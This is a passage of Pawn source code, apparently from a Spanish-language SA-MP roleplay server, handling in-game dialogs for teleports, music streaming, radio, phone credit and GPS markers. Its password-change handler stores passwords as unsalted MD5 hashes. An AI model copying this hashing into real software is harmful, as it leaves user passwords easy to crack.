		                LoadObjects(playerid);
		                SetPosEx(playerid, 243.2710, 302.7583, 999.1343+1, 0, 0, 0);
	    	            GameTextForPlayer(playerid, "~g~~h~lstv", 5000, 1);
	        	    }
	            	case 2:
	            	{
		                LoadObjects(playerid);
		                SetPosEx(playerid, 734.9713, -1358.6119, 25.5060, 0, 0, 0);
	    	            GameTextForPlayer(playerid, "~g~~h~lstv", 5000, 1);
	        	    }
		        }
		    }
		}
		case DIALOGO_CAMBIAR_CLAVE:
		{
			new tmp[124], tmp2[32], tmp3 = strlen(inputtext);
			
			if(!strlen(inputtext))return ShowPlayerDialog(playerid, DIALOGO_CAMBIAR_CLAVE, DIALOG_STYLE_INPUT, "Sistema de emergencia", "{ffd700}Por razones de seguridad deberan hacer un cambio de contraseña!\n{ffd700}Porfavor elegir una NUEVA contraseña en el siguiente bloque.\n{ff0000}Repito: NUEVA constraseña", "Aceptar", "");
			if(tmp3 < 6 || tmp3 > 31)return ShowPlayerDialog(playerid, DIALOGO_CAMBIAR_CLAVE, DIALOG_STYLE_INPUT, "Sistema de emergencia", "{ffd700}Por razones de seguridad deberan hacer un cambio de contraseña!\n{ffd700}Porfavor elegir una NUEVA contraseña en el siguiente bloque.\n{ff0000}Repito: NUEVA constraseña", "Aceptar", "");

			mysql_real_escape_string(inputtext, tmp2, servidor[mysqlControl]);
			mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "UPDATE zz_usuarios SET clave=md5('%e'), inv11=1 WHERE nombre='%s'", tmp2, Nombre(playerid));
			mysql_query(servidor[mysqlControl], tmp, true);
			
			ShowLoginDialog(playerid, DIALOGO_INGRESO);
			Mensaje(playerid, COLOR_VERDE, "Las cuentas fueron guardadas, Lamentamos los inconvenientes!");
		}
		case IMPORTAR_MOTOR:
		{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
	            	case 0:
					{
			        	MostrarDialogo(playerid, "{FFFFFF}Motor instalado: {B5BE7B}6 Cilindros.{FFFFFF} || Capacidad: {B5BE7B}1000 litros.");
						autos[idcar][cGas] = 1000;
					}
	        	    case 1:
					{
			        	MostrarDialogo(playerid, "{FFFFFF}Motor instalado: {B5BE7B}8 Cilindros.{FFFFFF} || Capacidad: {B5BE7B}1500 litros.");
						autos[idcar][cGas] = 1500;
					}
					case 2:
					{
			        	MostrarDialogo(playerid, "{FFFFFF}Motor instalado: {B5BE7B}10 Cilindros.{FFFFFF} || Capacidad: {B5BE7B}2000 litros.");
						autos[idcar][cGas] = 2000;
					}
					case 3:
					{
			        	MostrarDialogo(playerid, "{FFFFFF}Motor instalado: {B5BE7B}12 Cilindros.{FFFFFF} || Capacidad: {B5BE7B}2500 litros.");
						autos[idcar][cGas] = 2500;
					}
	        	}
	    	}
		    else
			{
				MostrarDialogo(playerid, "{FFFFFF}Motor instalado: {B5BE7B}6 Cilindros.{FFFFFF} || Capacidad: {B5BE7B}1000 litros.");
				autos[idcar][cGas] = 1000;
			}
		}
		case IPOD_MENU:
	 	{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
					case 0:
					{
					    new strcan[2000];
					    new can0[] = "Let her go - Passenger\nGet lucky - Daft Punk\nThrift shop - Macklemore\nJust give me a reason - Pink\nI could be the one - Avicii\n";
					    new can1[] = "Play hard - David Guetta\nHo hey - The Lumineers\nImpossible - James Arthur\nLive it up - Jennifer Lopez\nMore than friends - Inna\nBlurred lines - Robin Thicke\n";
					    new can2[] = "Come & get it - Selena Gomez\nOn top of the world - Imagine Dragons\nThe other side - Jason Derulo\nCorre! - Jesse & Joy\nI love it - Icona Pop\n";
					    new can3[] = "Turn on the radio - Xuso Jones\nRight now - Kostrok\nMirrors - Justin Timberlake\nLove me again - John Newman\nCero - Dani Martin\nStay - Rihanna\n";
					    new can4[] = "Quién - Pablo Alborán\nWhen I was your man - Bruno Mars\nNo digas nada -Cali & El Dandee\nUnbreakable - Marien Baker\nVuelvo a verte - Malu\nCamino de rosas - Alejandro Sanz\n";
				    	new can5[] = "Heartbreaker - Auryn\nFunketón - Efecto Pasillo\nWalks like Rihanna - The Wanted\nGitana - El viaje de Elliot\nMe enamoré (Feeling of love) - XRIZ\nTu jardín con enanitos - Melendi\nMondays - Yanela Brooks\n";
					    new can6[] = "Make my day - Auryn\nPretty boy - Edurne\nCon fuego - Soraya\nBoy toy - Angy\nViven - Rasel";
					    format(strcan, sizeof(strcan), "%s%s%s%s%s%s%s", can0, can1, can2, can3, can4, can5, can6);
						ShowPlayerDialog(playerid, IPOD_MP3, DIALOG_STYLE_LIST, "IPOD - Lista de Canciones", strcan, "Escuchar", "Atrás");
					}
		            case 1:
		            {
						ShowPlayerDialog(playerid, Radios, DIALOG_STYLE_LIST, 
				"Selecciona Tu Emisora", "{ADFF2F}Drumm Bass\n{7B68EE}LaMEGARADIO\nRMassiveDubstep\n{912CEE}ReservaRap\n{CAE1FF}Los40\nReggae\n{FF8000}House", 
				"Sintonizar", "Cancelar");
					}
					case 2:
					{
					    StopAudioStreamForPlayer(playerid);
					    Mensaje(playerid, COLOR_GRIS2, "Apagaste tu IPOD!");
					    format(string, sizeof(string), "* %s apaga su ipod y lo guarda en su bolsillo.", PlayerName(playerid));
					    ProxDetector(20.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
    				}
	 			}
   			}
 		}

		case IPOD_MP3:
		{
		    if(response)
			{
			    switch(listitem)
		    	{

		        	case 0:
		        	{
	                    StopAudioStreamForPlayer(playerid);
    	          		PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Passenger%20%20%20Let%20Her%20Go%20%5BOfficial%20Video%5D.mp3");

					}
					case 1:
					{
					    StopAudioStreamForPlayer(playerid);
    	          		PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Daft%20Punk%20%20%20Get%20Lucky%20%28Official%20Audio%29%20ft%20Pharrell%20Williams%5B1%5D.mp3");

					}
		        	case 2:
		        	{
			            StopAudioStreamForPlayer(playerid);
    	          		PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/MACKLEMORE%20%20RYAN%20LEWIS%20%20%20THRIFT%20SHOP%20FEAT%20WANZ%20%28OFFICIAL%20VIDEO%29.mp3");

        			}
        			case 3:
        			{
	        		    StopAudioStreamForPlayer(playerid);
    	          		PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/P%21nk%20%20%20Just%20Give%20Me%20A%20Reason%20ft%20Nate%20Ruess.mp3");

            	   	}
               		case 4:
               		{
	                    StopAudioStreamForPlayer(playerid);
    	          		PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Avicii%20vs%20Nicky%20Romero%20%20%20I%20Could%20Be%20The%20One%20%28Official%20Music%20Video%29.mp3");

					}
					case 5:
					{
					    StopAudioStreamForPlayer(playerid);
    	          		PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/David%20Guetta%20%20%20Play%20Hard%20%28Official%20Video%29%20ft%20Ne%20Yo%2C%20Akon.mp3");

					}
               		case 6:
               		{
	               	    StopAudioStreamForPlayer(playerid);
    	                PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/The%20Lumineers%20%20%20Ho%20Hey%20%28Official%20Video%29.mp3");

            	   	}
               		case 7:
               		{
	               		StopAudioStreamForPlayer(playerid);
						PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/James%20Arthur%20%20%20Impossible%20%20%20Official%20Single.mp3");

					}
               		case 8:
               		{
	               		StopAudioStreamForPlayer(playerid);
						PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Jennifer%20Lopez%20%20%20Live%20It%20Up%20ft%20Pitbull.mp3");

					}
					case 9:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/INNA%20feat%20Daddy%20Yankee%20%20%20More%20Than%20Friends%20%28Official%20Music%20Video%29.mp3");

            	   	}
                	case 10:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Robin%20Thicke%20%20%20Blurred%20Lines%20ft%20TI%2C%20Pharrell.mp3");

            	   	}
               		case 11:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Selena%20Gomez%20%20%20Come%20%20Get%20It.mp3");

            	   	}
               		case 12:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Imagine%20Dragons%20%20%20On%20Top%20of%20the%20World%20%20%20Lyrics.mp3");

            	   	}
               		case 13:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Jason%20Derulo%20%27The%20Other%20Side%27%20Lyrics.mp3");

            	   	}
               		case 14:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Jesse%20%20Joy%20%20%20Corre%20%20%28Lyric%20Video%29.mp3");

            	   	}
               		case 15:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Icona%20Pop%20%20%20I%20Love%20It%20%28feat%20Charli%20XCX%29%20%5BOFFICIAL%20VIDEO%5D.mp3");

            	   	}
               		case 16:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Xuso%20Jones%20%20%20Turn%20On%20The%20Radio%20%28Lyric%20Video%29.mp3");

            	   	}
               		case 17:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Kostrok%20%20%20Right%20Now%20%28Official%20Lyric%20Video%29.mp3");

            	   	}
               		case 18:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Justin%20Timberlake%20%20%20Mirrors.mp3");

            	   	}
               		case 19:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/John%20Newman%20%20%20Love%20Me%20Again.mp3");

            	   	}
               		case 20:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Dani%20Martin%20%20%20Cero.mp3");

            	   	}
               		case 21:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Rihanna%20%20%20Stay%20ft%20Mikky%20Ekko.mp3");

            	   	}
               		case 22:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Pablo%20Alboran%20%20%20Qui%C3%A9n.mp3");

            	   	}
               		case 23:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Bruno%20Mars%20%20%20When%20I%20Was%20Your%20Man%20%5BOfficial%20Video%5D.mp3");

               		}
            	   	case 24:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Cali%20Y%20El%20Dandee%20%20%20No%20Digas%20Nada%20%28D%C3%A9j%C3%A0%20vu%29%20%20%20Lyric%20Video.mp3");

            	   	}
               		case 25:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Marien%20Baker%20%20%20Unbreakable%20%28feat%20Shaun%20Frank%29.mp3");

            	   	}
               		case 26:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Malu%20Con%20Pablo%20Alboran%20%20%20Vuelvo%20A%20Verte.mp3");

            	   	}
               		case 27:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Alejandro%20Sanz%20%20%20Camino%20De%20Rosas.mp3");

            	   	}
               		case 28:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/AURYN%20%20Heartbreaker%20%28Lyric%20video%29.mp3");

            	   	}
               		case 29:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Efecto%20pasillo%20%20%20Funket%C3%B3n.mp3");

            	   	}
               		case 30:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/The%20Wanted%20%20%20Walks%20Like%20Rihanna.mp3");

            	   	}
               		case 31:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/El%20Viaje%20De%20Elliot%20%20%20Gitana%20%28Videoclip%20Oficial%29.mp3");

            	   	}
               		case 32:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/XRIZ%20%20%20Me%20Enamor%C3%A9%20%28Feeling%20Of%20Love%29.mp3");

            	   	}
               		case 33:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Melendi%20%20%20Tu%20Jard%C3%ADn%20con%20enanitos.mp3");

            	   	}
               		case 34:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Yanela%20Brooks%20%20%20Mondays%20ft%20Brian%20Cross%20%28Audio%20Oficial%29.mp3");

            	   	}
               		case 35:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Auryn%20%20%20Make%20my%20day.mp3");

            	   	}
               		case 36:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Edurne%20%20%20Pretty%20Boy.mp33");

               		}
            	   	case 37:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Soraya%20%20%20Con%20Fuego%20%28Official%20video%29.mp3");

               		}
            	   	case 38:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Angy%20%20%20Boytoy.mp3");

            	   	}
               		case 39:
					{
					    StopAudioStreamForPlayer(playerid);
    	     			PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/88698185/canciones/Rasel%20%20%20Viven%20%28feat%20Jadel%29.mp3");

            	   	}

           		}
			} else ShowPlayerDialog(playerid, IPOD_MENU, DIALOG_STYLE_LIST, "IPOD Menú", "MP3\nRadio\nApagar", "Aceptar", "Salir");
		}
		case Radios:
		{
		    if(response)
			{
			    switch(listitem)
		    	{
		        	case 0:
		   			{
			        Mensaje(playerid, COLOR_AMARILLO, "Radio DrumBass Sintonizada");
					GameTextForPlayer(playerid, "~w~Radio DrumBass Sintonizada", 5000, 3);
			        PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/59142770/Emisoras/Drum%26Bass.pls/");
			        }
		        	case 1:
	        	    {
			        Mensaje(playerid, COLOR_AMARILLO, "LaMEGARADIO Sintonizada");
			        GameTextForPlayer(playerid, "~Y~LaMEGARADIO Sintonizada", 5000, 3);
			        PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/59142770/Emisoras/LaMEGARADIO.pls/");

			        }
					case 2:
					{
			        Mensaje(playerid, COLOR_AMARILLO, "Radio MassiveDubstep Sintonizada");
			    	GameTextForPlayer(playerid, "~w~Radio MassiveDubstep Sintonizada", 5000, 3);
			    	PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/59142770/Emisoras/Massive%20Dubstep.pls/");

			        }
		        	case 3:
		        	{
			        Mensaje(playerid, COLOR_AMARILLO, "Radio ReservaRap Sintonizada");
			        GameTextForPlayer(playerid, "~w~Radio ReservaRap Sintonizada", 5000, 3);
			    	PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/59142770/Emisoras/GranReservaRAP.m3u/");

			        }
        			case 4:
        	        {
			        Mensaje(playerid, COLOR_AMARILLO, "Radio Los40 Sintonizada");
			        GameTextForPlayer(playerid, "~w~Radio Los40 Sintonizada", 5000, 3);
			    	PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/59142770/Emisoras/LOS40.pls/");
			        }
               		case 5:
               		{
			        Mensaje(playerid, COLOR_AMARILLO, "Radio Reggae Sintonizada");
			        GameTextForPlayer(playerid, "~w~Radio Reggae Sintonizada", 5000, 3);
			    	PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/59142770/Emisoras/La%20Grosse%20Radio%20Reggae.pls");

			        }
					case 6:
					{
			        Mensaje(playerid, COLOR_AMARILLO, "Radio House Sintonizada");
			        GameTextForPlayer(playerid, "~w~Radio House Sintonizada", 5000, 3);
			    	PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/u/59142770/Emisoras/HouseTime.pls");

			        }
           		}
			}
		}
		case DIALOGO_RECARGAR_TELEFONO:
		{
		    if(response)
		    {
	    	    if(DetectNumber(inputtext))
				{
	                RecNumber[playerid] = strval(inputtext);
					format(string, sizeof(string), "{FFFFFF}¿Confirmas tu numero celular: %d?", RecNumber[playerid]);
					ShowPlayerDialog(playerid, DIALOGO_NUMERO_CONFIRMADO, DIALOG_STYLE_MSGBOX, "{018CFE}MOVISTAR", string, "Confirmar", "Cancelar");
				}
				else 
				{ 
					ShowPlayerDialog(playerid, DIALOGO_RECARGAR_TELEFONO, DIALOG_STYLE_INPUT, "{018CFE}MOVISTAR - Operadora", "{FFFFFF}Solo se permite ingresar números, mínimo 4 digitos\nIngrese su numero nuevamente:", "Aceptar", "Cancelar"); 
				}
			}
			return 1;
		}
		case DIALOGO_NUMERO_CONFIRMADO:
		{
		    if(response)
		    {
	    	    if(RecNumber[playerid] == cuenta[playerid][cTelefono])
        		{
					new strong[sizeof(RECpaquetes) * 74];
					for(new i=0; i<sizeof(RECpaquetes); i++)
					{
						format(strong, sizeof(strong), "%s\n{ffffff}%d Segundos - %d Mensajes - Costo: {008000}%d${ffffff}\n", strong, RECpaquetes[i][recPsaldo], RECpaquetes[i][recPsms], RECpaquetes[i][recPcosto]);
					}
		        	ShowPlayerDialog(playerid, DIALOGO_SALDO_PAQUETES, DIALOG_STYLE_LIST, "{018CFE}Paquetes MOVISTAR", strong, "Seleccionar", "Cancelar");
		        	RecNumber[playerid] = 0;
				}
				else 
				{
					ShowPlayerDialog(playerid, DIALOGO_RECARGAR_TELEFONO, DIALOG_STYLE_INPUT, "{018CFE}MOVISTAR - Operadora", "{FFFFFF}Segun nuestro sistema ese numero esta a nombre\nde otra persona, ingrese nuevamente su número:", "Aceptar", "Cancelar"); 
				}
   			}
		    else 
			{ 
				ShowPlayerDialog(playerid, DIALOGO_RECARGAR_TELEFONO, DIALOG_STYLE_INPUT, "{018CFE}Operadora de Telefonia Celular MOVISTAR", "{FFFFFF}Ingresa tu numero celular para realizar la recarga", "Aceptar", "Cancelar"); 
			}
			return 1;
		}
		case DIALOGO_SALDO_PAQUETES:
		{
		    if(response)
		    {
				if(obtenerDinero(playerid) < RECpaquetes[listitem][recPcosto])return Mensaje(playerid, COLOR_GRIS3, "Usted no tiene suficiente dinero para comprar este paquete.");

				pierdeDinero(playerid, RECpaquetes[listitem][recPcosto]);
				cuenta[playerid][cSaldo] += RECpaquetes[listitem][recPsaldo];
				cuenta[playerid][cMensajes] += RECpaquetes[listitem][recPsms];
				
				format(string, sizeof(string), "{FFFFFF}Recarga celular realizada: %d Segundos - %d Mensajes", RECpaquetes[listitem][recPsaldo], RECpaquetes[listitem][recPsms]);
				ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "{018CFE}MOVISTAR - Confirmación", string, "Aceptar", "");
				return 1;
		    }
		}
		case DIALOGO_BARRENDERO:
		{
			if(!response)return 1;
			new listed = listitem + 1;
			cuenta[playerid][selecciono] = listed;
			SetPlayerCheckpoint(playerid, trabBarrendero[listed][barrPos][0], trabBarrendero[listed][barrPos][1], trabBarrendero[listed][barrPos][2], 4.0);
			format(string, sizeof(string), "~g~%s ~w~fue marcada en su GPS.", trabBarrendero[listed][barrLugar]);
			TextoInformatico(10, playerid, string);
			return 1;
		}
		case DIALOGO_MAPA:
		{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
		            case 0: SetPlayerCheckpoint(playerid, 1481.0374, -1772.3131, 18.7958, 3.0);  // Ayuntamiento
	    	        case 1: SetPlayerCheckpoint(playerid, 1545.8611, -1680.0559, 13.5612, 3.0);  // LSPD
	        	    case 2: SetPlayerCheckpoint(playerid, 2240.9753, -2218.4404, 13.5469, 3.0);  // Taller de Los Santos
	        	    case 3: SetPlayerCheckpoint(playerid, 2073.2747, -1914.5770, 13.3648, 3.0);  // Licencieria
		            case 4: SetPlayerCheckpoint(playerid, 2266.3047, -1666.6727, 15.3930, 3.0);  // Binco
	    	        case 5: SetPlayerCheckpoint(playerid, 1318.7915, -899.3480, 39.5781, 3.0);   // 24-7 Vinewood
	        	    case 6: SetPlayerCheckpoint(playerid, 1812.9063, -1883.0615, 13.5781, 3.0);  // 24-7 Unity
	        	    case 7: SetPlayerCheckpoint(playerid, 1351.0753, -1750.7668, 13.3648, 3.0);  // 24-7 Ayuntamiento
		            case 8: SetPlayerCheckpoint(playerid, 2421.8948, -2077.9514, 13.5538, 3.0);  // Deposito de la LSPD
	        	    case 9: SetPlayerCheckpoint(playerid, 1271.5137, -994.5891, 35.6477, 3.0);  // Banco
	        	    case 10: SetPlayerCheckpoint(playerid, 558.4728, -1277.1632, 17.2482, 3.0);  // Consecionaria
	        	    case 11: SetPlayerCheckpoint(playerid, 2781.1042, -1813.3430, 11.8438, 3.0); // Paintball
		            case 12: SetPlayerCheckpoint(playerid, 1020.6985, -1123.0210, 23.8680, 3.0); // Casino
		            case 13: SetPlayerCheckpoint(playerid, 2430.1338, -2483.2861, 13.8590, 3.0); // Pista de Karting
		            case 14: SetPlayerCheckpoint(playerid, 2111.7705, -1910.9108, 13.5681, 3.0); // Localizador de Vehiculos
		            case 15: SetPlayerCheckpoint(playerid, 1780.8955, -1719.8694, 13.5415, 3.0); // Tienda de Electronica
		            case 16: SetPlayerCheckpoint(playerid, 1088.3285, -1379.8683, 13.8077, 3.0); // Cabina de anuncios
		            case 17: SetPlayerCheckpoint(playerid, 2047.1602, -2095.8225, 13.5469, 3.0); // Prision Federal
		            case 18:
					{
						new str[50 * sizeof(trabajos)];
						for(new i=1; i<sizeof(trabajos); i++)
						{
							format(str, sizeof(str), "%s\n{FFA500}Nivel: %d\t{ffffff}%s", str, trabajos[i][trabNivel], trabajos[i][trabNombre]);
						}
						ShowPlayerDialog(playerid, DIALOGO_TRABAJO_UBICACION, DIALOG_STYLE_LIST, "Trabajos de la ciudad", str, "Aceptar", "Atras");
					}
	   	    	}Mensaje(playerid, COLOR_BLANCO, "{FFFFFF}Se marcó la ubicación en el minimapa en forma de checkpoint (punto rojo).");
	    	}
	    }
	    case DIALOGO_TRABAJO_UBICACION:
	    {
			if(!response)return ShowPlayerDialog(playerid, DIALOGO_MAPA, DIALOG_STYLE_LIST, "{018CFE}Puntos de interes", "{FFFFFF}» Ayuntamiento\n» Juzgados\n» Comisaria de Los Santos\n» Taller\n» Licencieria\n» Binco\n» 24-7 Vinewood\n» 24-7 Unity\n» 24-7\n» Deposito de la LSPD\n» Joyeria\n» Banco\n» Grotti\n» Cyber\n» Biblioteca\n» Baño Público\n» Iglesia\n» Casino\n» Trabajos", "Aceptar", "Salir");
	        if(response)
	        {
				new listid = listitem + 1;
				SetPlayerCheckpoint(playerid, trabajos[listid][trabPos][0], trabajos[listid][trabPos][1], trabajos[listid][trabPos][2], 4.0);
	        }
	    }
		case GPS_DIALOG:
		{
	 	    if(response)
		    {
	    	    switch(listitem)
	        	{
	            	case 0: ShowPlayerDialog(playerid, BARES, DIALOG_STYLE_LIST, "{018CFE}GPS - Bares/Discotecas:", "{FFFFFF}Alhambra\nClub VIP\nBar Groove", "Marcar", "Atrás");
		            case 1: ShowPlayerDialog(playerid, EMERGENCIAS, DIALOG_STYLE_LIST, "{018CFE}GPS - Emergencias:", "{FFFFFF}SAMUR\nLSPD\nFBI\nSAEM", "Marcar", "Atrás");
		            case 2: ShowPlayerDialog(playerid, NEGOCIOS, DIALOG_STYLE_LIST, "{018CFE}GPS - Negocios:", "{FFFFFF}24/7 Ayuntamiento\n24/7 Unity\n24/7 Vinewood\nPizza Stark\nAmmunation\nBinco\nGimnasio\nVictim", "Marcar", "Atrás");
	    	        case 3: ShowPlayerDialog(playerid, LUGARPUBLICO, DIALOG_STYLE_LIST, "{018CFE}GPS - Lugares Públicos:", "{FFFFFF}Ayuntamiento\nBanco\nGasolinera\nGrotti\nCyber\nCNN\nBiblioteca\nPaintball\nBowling\nIglesia\nCasino", "Marcar", "Atrás");
	        	    case 4: ShowPlayerDialog(playerid, SERVICIOS, DIALOG_STYLE_LIST, "{018CFE}GPS - Servicios:", "{FFFFFF}Mecánicos\nAutoescuela\nCIA", "Marcar", "Atrás");
				}
		    }
 		}
 		case BARES:
		{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
	            	case 0: SetPlayerCheckpoint(playerid, 1828.7018, -1682.9352, 13.5469, 3.0);
		            case 1: SetPlayerCheckpoint(playerid, 1805.9573, -1576.6815, 13.4496, 3.0);
		            case 2: SetPlayerCheckpoint(playerid, 2305.5979, -1652.2327, 14.4630, 3.0);
        	 	} Mensaje(playerid, COLOR_BLANCO, "{018CFE}GPS: {FFFFFF}Ubicacion establecida en el mapa.");
	    	} else ShowPlayerDialog(playerid, GPS_DIALOG, DIALOG_STYLE_LIST, "{018CFE}Control GPS", "{FFFFFF}Bares\nEmergencias\nNegocios\nLugares Públicos\nServicios", "Aceptar", "Salir");
		}
		case EMERGENCIAS:
		{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
		            case 0: SetPlayerCheckpoint(playerid, 1186.7639, -1324.5430, 13.5593, 3.0);
		            case 1: SetPlayerCheckpoint(playerid, 1545.0645, -1675.4355, 13.5596, 3.0);
	    	        case 2: SetPlayerCheckpoint(playerid, 912.8531, -992.2309, 38.0075, 3.0);
	        	    case 3: SetPlayerCheckpoint(playerid, 2610.6838, -2396.7205, 13.6252, 3.0);
         		} Mensaje(playerid, COLOR_BLANCO, "{018CFE}GPS: {FFFFFF}Ubicacion establecida en el mapa.");
	    	} else ShowPlayerDialog(playerid, GPS_DIALOG, DIALOG_STYLE_LIST, "{018CFE}Control GPS", "{FFFFFF}Bares\nEmergencias\nNegocios\nLugares Públicos\nServicios", "Aceptar", "Salir");
		}
		case NEGOCIOS:
		{
		    if(response)
		    {
        	    switch(listitem)
				{
	                case 0: SetPlayerCheckpoint(playerid, 1352.7506, -1754.8582, 13.3568, 3.0);
    	            case 1: SetPlayerCheckpoint(playerid, 1829.0416, -1843.0101, 13.5781, 3.0);
        	        case 2: SetPlayerCheckpoint(playerid, 1315.1741, -900.1744, 39.5781, 3.0);
            	    case 3: SetPlayerCheckpoint(playerid, 2101.3071, -1806.8872, 13.5547, 3.0);
                	case 4: SetPlayerCheckpoint(playerid, 1363.2135, -1279.6903, 13.5469, 3.0);
                	case 5: SetPlayerCheckpoint(playerid, 2245.0457, -1661.8610, 15.4690, 3.0);
					case 6: SetPlayerCheckpoint(playerid, 2225.8884, -1724.2968, 13.5599, 3.0);
					case 7: SetPlayerCheckpoint(playerid, 454.6484, -1503.0116, 30.8653, 3.0);
				} Mensaje(playerid, COLOR_BLANCO, "{018CFE}GPS: {FFFFFF}Ubicacion establecida en el mapa.");
	    	} else ShowPlayerDialog(playerid, GPS_DIALOG, DIALOG_STYLE_LIST, "{018CFE}Control GPS", "{FFFFFF}Bares\nEmergencias\nNegocios\nLugares Públicos\nServicios", "Aceptar", "Salir");
		}
		case LUGARPUBLICO:
		{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
		            case 0: SetPlayerCheckpoint(playerid, 1480.0077, -1739.7684, 13.5469, 3.0);
		            case 1: SetPlayerCheckpoint(playerid, 1271.5137, -994.5891, 35.6477, 3.0); //banco
	    	        case 2: SetPlayerCheckpoint(playerid, 1003.5906, -940.7248, 42.1797, 3.0);
	        	    case 3: SetPlayerCheckpoint(playerid, 555.1510, -1260.8953, 17.2422, 3.0);
